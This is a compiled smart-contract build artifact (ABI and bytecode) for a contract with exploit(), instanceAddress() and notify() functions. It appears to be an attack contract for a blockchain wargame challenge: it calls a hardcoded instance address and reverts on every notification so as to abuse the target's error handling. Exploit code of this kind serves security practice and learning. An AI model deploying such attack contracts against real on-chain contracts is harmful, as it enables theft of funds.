{"abi":[{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"instanceAddress","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address payable"}],"stateMutability":"view"},{"type":"function","name":"notify","inputs":[{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60806040525f80546001600160a01b03191673a16e02e87b7454126e5e10d957a927a7f5b5d2be1790553480156033575f5ffd5b50610212806100415f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c806363d9b7701461004357806398d078b41461004d578063bd39e29714610060575b5f5ffd5b61004b6100a8565b005b61004b61005b36600461019f565b610139565b5f5461007f9073ffffffffffffffffffffffffffffffffffffffff1681565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200160405180910390f35b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663251436386040518163ffffffff1660e01b81526004016020604051808303815f875af1158015610112573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013691906101b6565b50565b6040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600d60248201527f4e6f746966792072657665727400000000000000000000000000000000000000604482015260640160405180910390fd5b5f602082840312156101af575f5ffd5b5035919050565b5f602082840312156101c6575f5ffd5b815180151581146101d5575f5ffd5b939250505056fea264697066735822122013a2a230b3db7461f288c36f1d6765bd8c7e453c47b876fef326692440d62e6f64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"exploit()":"63d9b770","instanceAddress()":"bd39e297","notify(uint256)":"98d078b4"},"id":0}